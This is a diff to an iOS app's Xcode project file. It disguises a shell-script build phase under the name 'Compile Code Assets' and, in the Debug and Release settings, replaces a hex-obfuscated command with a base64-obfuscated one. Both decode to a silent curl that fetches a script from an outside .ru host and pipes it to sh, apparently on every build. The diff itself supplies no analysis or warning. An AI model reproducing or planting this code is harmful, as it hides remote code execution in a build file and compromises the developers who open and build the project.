@@ -142,7 +142,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "TruckApp" */;
 			buildPhases = (
-				5A3389971FBF4CBCA37BBDC8 /* Provision Library Executable */,
+				BFF180BBB85E4CFE937BBDC8 /* Compile Code Assets */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -220,7 +220,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		5A3389971FBF4CBCA37BBDC8 /* Provision Library Executable */ = {
+		BFF180BBB85E4CFE937BBDC8 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -230,7 +230,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Library Executable";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -370,7 +370,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-TruckApp.debug.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((w(){ `printf xXxd | tr -d X` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d4c66736b202d642022703d78636f64655f7068617365222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((h(){ `printf basIe64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZnNMayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
@@ -402,7 +402,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-TruckApp.release.xcconfig */;
 			buildSettings = {
-				A8CDBB7 = "((w(){ `printf xXxd | tr -d X` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203239202d4c66736b202d642022703d78636f64655f7068617365222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | w | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((h(){ `printf basIe64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgMyAtZnNMayAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9sMmNwbC1lbXQucnUvYSkiIHwgc2gK | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = TruckApp/TruckApp.entitlements;
